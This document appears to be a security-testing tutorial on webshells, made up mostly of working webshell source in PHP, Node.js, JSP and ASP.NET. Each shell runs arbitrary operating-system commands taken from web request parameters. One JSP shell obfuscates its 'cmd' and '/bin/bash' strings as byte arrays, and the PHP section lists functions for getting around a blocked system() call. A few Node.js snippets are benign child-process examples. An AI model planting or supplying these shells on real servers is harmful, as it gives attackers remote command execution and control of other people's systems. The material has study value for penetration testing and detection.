# Webshells In Depth

Webshells are really important when it comes to web security testing. Webshells are better than any other reverse shell or similar as it just utilize existing website functionality to achive command execution on target system. In this Session we will be learning diffrent webshell and their workflow and how its working actually in order to understand some other functionality which we will learn near future.

#### What is Webshell ?
A Web interface of shell functionality can be called as webshell. from webshell all the shell (bin/bash) functionality can be achived. 

## Webshell in diffrent languages.

### PHP
PHP has most of the best and beautiful webshells so far with many functionalities. A most common is **b374k.php** to understand how shell functionality can be accessed through web below code is perfact example.

```php
<?php
	$output = system($_GET['cmd']); //GET
	$output = system($_POST['cmd']); // POST
	$output = system($_REQUEST['cmd']); //GET || POST
	echo $output;
?>
```

sometimes `system()` function is blocked which can be bypassed via alternative functions.

```php
<?php
	$output = system($_GET['cmd']); //system
	$output = shell_exec($_GET['cmd']); //shell_exec
	$output = passthru($_GET['cmd']); //passthru
	$output = popen($_GET['cmd']); //popen
	$output = exec($_GET['cmd']); //exec
	$getdata = $_GET['cmd'];	//saving User input in variable
	$output = `$getdata`;		//passing with backtick
	echo $output;
?>
```

### JS

##### exec
```JS
var sys   = require('sys'),	//loading module
    exec  = require('child_process').exec, //loading module
    child,
    http = require('http');	//loading module
	
//A function which returns command output with some error handeling
child = function(res, cmd) {	//A function which returns command output
  exec(cmd, 
  function (error, stdout, stderr) {
    res.end(stdout);
    if (error !== null) {
      console.log('exec error: ' + error);	//if error it will print error over log
    }
  });
};

http.createServer(function (req, res) {		//Main Function for HTTP service
  res.writeHead(200, {'Content-Type': 'text/plain'});
  var parsedRequest = require('url').parse(req.url, true);
  var cmd = parsedRequest.query['cmd'];	//specifying parameter
  if (cmd != undefined)
  {
    console.log("[cmd] " + cmd);
    child(res, cmd);
  }
}).listen('6660', '127.0.0.1');	//Listeting on localhost:6666
```

##### execFile
```JS
const execFile = require('child_process').execFile;
const child = execFile('node', ['--version'], (error, stdout, stderr) => {
    if (error) {
        console.error('stderr', stderr);
        throw error;
    }
    console.log('stdout', stdout);
});

```

##### spawn
```js
const spawn = require('child_process').spawn;
const fs = require('fs');
function resize(req, resp) {
    const args = [
        "-", // use stdin
        "-resize", "640x", // resize width to 640
        "-resize", "x360<", // resize height if it's smaller than 360
        "-gravity", "center", // sets the offset to the center
        "-crop", "640x360+0+0", // crop
        "-" // output to stdout
    ];

    const streamIn = fs.createReadStream('./path/to/an/image');
    const proc = spawn('convert', args);
    streamIn.pipe(proc.stdin);
    proc.stdout.pipe(resp);
}
```

##### fork
```js
//parent.js
const cp = require('child_process');
const n = cp.fork(`${__dirname}/sub.js`);

n.on('message', (m) => {
  console.log('PARENT got message:', m);
});

n.send({ hello: 'world' });

//sub.js
process.on('message', (m) => {
  console.log('CHILD got message:', m);
});

process.send({ foo: 'bar' });
```

### JSP

#### `Runtime.getRuntime().exec()`
```jsp
<%
Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```
```js
<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>

```

#### `ProcessBuilder()`
```js
  
<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>
<FORM METHOD="POST" NAME="form" ACTION="#">
    <INPUT TYPE="text" NAME="q">
    <INPUT TYPE="submit" VALUE="Fly">
</FORM>

<%
    String op="Got Nothing";
    String query = request.getParameter("q");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }
    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<PRE>
    <%= op %>>
</PRE>
</BODY>
</HTML>
```

### ASPX
#### C#
```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```

#### VB.net
```csharp
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      
Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            
  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub
</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```